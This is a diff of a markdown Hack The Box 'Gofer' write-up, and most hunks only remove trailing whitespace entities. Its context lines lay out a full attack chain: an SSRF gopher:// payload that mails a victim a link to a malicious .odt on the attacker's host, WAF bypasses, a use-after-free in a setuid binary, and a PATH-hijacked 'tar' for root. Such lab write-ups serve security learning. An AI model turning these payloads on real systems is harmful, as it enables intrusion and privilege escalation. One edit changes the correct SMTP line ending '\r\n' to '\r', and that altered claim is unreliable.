@@ -35,7 +35,7 @@ PORT    STATE SERVICE     VERSION
 Service Info: Host: gofer.htb
 ```
 
-We can add this domain to our `/etc/hosts` file.&#x20;
+We can add this domain to our `/etc/hosts` file.
 
 ### Web Enumeration -> LFI
 
@@ -47,7 +47,7 @@ Within the site, there wasn't much apart from a few names like Jocelyn Hudson an
 
 <figure><img src="../../.gitbook/assets/image (4123).png" alt=""><figcaption></figcaption></figure>
 
-`gobuster` scans reveal nothing much, but a `wfuzz` scan shows one subdomain has been returned.&#x20;
+`gobuster` scans reveal nothing much, but a `wfuzz` scan shows one subdomain has been returned.
 
 ```
 $ wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --hc 400,301 -H 'Host:FUZZ.gofer.htb' http://gofer.htb
@@ -108,13 +108,13 @@ $ curl -X POST http://proxy.gofer.htb/index.php?url=file:///etc/passwd
 <html><body>Blacklisted keyword: file:// !</body></html>
 ```
 
-A bit more testing by removing `/` characters eventually works! This tells me that the WAF is rather weak.&#x20;
+A bit more testing by removing `/` characters eventually works! This tells me that the WAF is rather weak.
 
 <figure><img src="../../.gitbook/assets/image (4125).png" alt=""><figcaption></figcaption></figure>
 
 ### SMB -> Phishing Download
 
-Port 445 is open on this Linux host, and it shows us one share.&#x20;
+Port 445 is open on this Linux host, and it shows us one share.
 
 ```
 $ smbmap -H 10.129.53.84                       
@@ -175,11 +175,11 @@ PS: Last thing for Tom; I know you're working on our web proxy but if you could 
 ```
 {% endcode %}
 
-We need to use an `.odt` format to exploit this, and it appears that this is from the user Jeff Davis from the company site (with a username of `jdavis`, so we know the username naming convention).&#x20;
+We need to use an `.odt` format to exploit this, and it appears that this is from the user Jeff Davis from the company site (with a username of `jdavis`, so we know the username naming convention).
 
-Since we have some kind of SSRF on the `proxy` service, we might be able to force a user to download and execute a malicious `.odt` file via macros to get the first shell. However, we first need to find out how to send an email through the `proxy` to the user since SMTP is not publicly facing.&#x20;
+Since we have some kind of SSRF on the `proxy` service, we might be able to force a user to download and execute a malicious `.odt` file via macros to get the first shell. However, we first need to find out how to send an email through the `proxy` to the user since SMTP is not publicly facing.
 
-Based on the box name alone, I sort of figured out that we need to use the `gopher://` protocol, which is used to send files to other users.&#x20;
+Based on the box name alone, I sort of figured out that we need to use the `gopher://` protocol, which is used to send files to other users.
 
 {% embed url="https://infosecwriteups.com/server-side-request-forgery-to-internal-smtp-access-dea16fe37ed2" %}
 
@@ -227,7 +227,7 @@ $ curl -X 'POST' 'http://proxy.gofer.htb/index.php?url=gopher://127.0.0.1:25/_MA
 ```
 {% endcode %}
 
-We can specify the IP address in decimal mode in order to bypass this.&#x20;
+We can specify the IP address in decimal mode in order to bypass this.
 
 {% code overflow="wrap" %}
 ```
@@ -236,7 +236,7 @@ $ curl -X 'POST' 'http://proxy.gofer.htb/index.php?url=gopher://2130706433:25/_M
 ```
 {% endcode %}
 
-However, even after bypassing the WAF, it doesn't work and I get no hits on my HTTP server. I URL decoded it and found that there was some syntax errors with the commands send to SMTP and also some control character errors, since we needed to send `\r\n` to register as an 'Enter' key.&#x20;
+However, even after bypassing the WAF, it doesn't work and I get no hits on my HTTP server. I URL decoded it and found that there was some syntax errors with the commands send to SMTP and also some control character errors, since we needed to send `\r` to register as an 'Enter' key.
 
 ```
 http://proxy.gofer.htb/index.php?url=gopher://2130706433:25/_MAIL FROM:iamanidiot@gofer.htb
@@ -247,7 +247,7 @@ Subject:hello testing
 Message:http://10.10.14.42/bad.odt
 ```
 
-I edited the payload a bit and URL encoded it to send the&#x20;
+I edited the payload a bit and URL encoded it to send the
 
 {% code overflow="wrap" %}
 ```
@@ -284,7 +284,7 @@ Since there were some quotes I was lazy to deal with, I sent it in Burp and got 
 
 <figure><img src="../../.gitbook/assets/image (4126).png" alt=""><figcaption></figcaption></figure>
 
-We would also get hits on our HTTP server.&#x20;
+We would also get hits on our HTTP server.
 
 ### Document Creation -> RCE
 
@@ -355,8 +355,8 @@ I transferred the binary back to my machine via `base64` and used `ghidra` to an
 <figure><img src="../../.gitbook/assets/image (4131).png" alt=""><figcaption></figcaption></figure>
 
 * It allocates 40 bytes for the username in the Heap via `malloc(0x28)`, and afterwards checks whether the `malloc` worked.
-* There seems to be 2 parts for this memory, of which it uses the first 24 (0x18) bytes for the `username` since the username part is set to the first block of memory.&#x20;
-* The next 16 bytes appears to be something else. `_Var1` is the UID of the current user, and if we are `root`, it sets the 25th to 29th byte to `0x6e696d6461`. If we are not an admin, it just sets the next part to `0x72657375`.&#x20;
+* There seems to be 2 parts for this memory, of which it uses the first 24 (0x18) bytes for the `username` since the username part is set to the first block of memory.
+* The next 16 bytes appears to be something else. `_Var1` is the UID of the current user, and if we are `root`, it sets the 25th to 29th byte to `0x6e696d6461`. If we are not an admin, it just sets the next part to `0x72657375`.
 * When decoded, the non-root user is called `user` and the `root` user is assigned as `admin`:
 
 ```
@@ -366,7 +366,7 @@ $ echo 0x6e696d6461 | xxd -r -p
 nimda
 ```
 
-* So basically, the first 24 bytes is the username, and the next 16 bytes is the privilege level of the user, which is set to `user` by default.&#x20;
+* So basically, the first 24 bytes is the username, and the next 16 bytes is the privilege level of the user, which is set to `user` by default.
 
 Option 3 is the delete user option, and it is vulnerable due to dangling pointers:
 
@@ -393,8 +393,8 @@ This part of the code checks whether the role of the user has been set to `admin
 To exploit this, we need to:
 
 * Create a user -> Creates the allocated block of 40 bytes.
-* Delete the user -> Creates a dangling pointer to our first user created.&#x20;
-* Write a note -> Using the notes function, we can write 24 characters for the username, and the have `admin` after the 24th byte to escalate privileges, which looks something like this: `111111111111111111111111admin`.&#x20;
+* Delete the user -> Creates a dangling pointer to our first user created.
+* Write a note -> Using the notes function, we can write 24 characters for the username, and the have `admin` after the 24th byte to escalate privileges, which looks something like this: `111111111111111111111111admin`.
 * Use option 8 to execute our malicious `tar` binary.
 
 ### Exploit -> Root
@@ -409,7 +409,7 @@ chmod 777 tar
 export PATH=~:$PATH
 ```
 
-Then,  follow the exploit path I laid above.
+Then, follow the exploit path I laid above.
 
 ```
 tbuckley@gofer:~$ /usr/local/bin/notes 
